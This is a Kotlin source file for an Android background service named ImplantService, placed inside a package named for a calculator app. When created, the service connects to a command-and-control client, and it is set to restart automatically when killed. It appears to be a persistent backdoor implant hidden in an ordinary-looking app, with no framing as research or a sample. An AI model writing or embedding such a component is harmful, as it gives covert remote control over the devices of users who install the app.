package com.darkempire78.opencalculator.implant

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder

class ImplantService : Service() {
    override fun onCreate() {
        super.onCreate()
        C2Client.connect()
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        fun start(context: Context) {
            context.startService(Intent(context, ImplantService::class.java))
        }
    }
}
